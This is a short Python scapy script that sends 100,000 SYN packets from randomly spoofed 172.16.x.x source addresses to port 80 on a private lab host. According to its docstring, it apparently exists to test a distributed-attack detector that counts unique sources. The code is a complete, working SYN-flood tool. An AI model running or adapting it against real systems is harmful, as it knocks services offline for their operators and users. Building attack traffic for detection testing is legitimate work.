"""
syn_flood2.py — Complementary flood using 172.16.x.x source IPs.

Used alongside syn_flood.py (which uses 10.0.x.x) to simulate a distributed
attack: two fully-distinct source IP ranges, both captured by two agents, merged
by the aggregator into a single cardinality estimate that exceeds the threshold.

Usage:
    # Terminal A — primary flood (10.0.x.x range, ~65k unique sources)
    python syn_flood.py

    # Terminal B — secondary flood (172.16.x.x range, ~65k unique sources)
    python syn_flood2.py
"""
from scapy.all import sendp, Ether, IP, TCP
import random

# Same target as syn_flood.py
target_ip = "192.168.65.3"

# Update this to your Npcap interface GUID:
#   python -c "from scapy.all import get_if_list; print(get_if_list())"
iface = r"\Device\NPF_{02231860-CD13-47AB-9975-C66676B8ACE5}"

num_packets = 100000
target_port = 80

print(f"[*] SYN-flooding {target_ip}:{target_port} with {num_packets} packets from random 172.16.x.x sources")

for i in range(num_packets):
    src_ip = f"172.16.{random.randint(0,255)}.{random.randint(1,254)}"
    pkt = Ether() / IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
    sendp(pkt, iface=iface, verbose=0)
    if (i + 1) % 10000 == 0:
        print(f"[*] Sent {i + 1}/{num_packets} packets")

print("[+] Flood complete.")
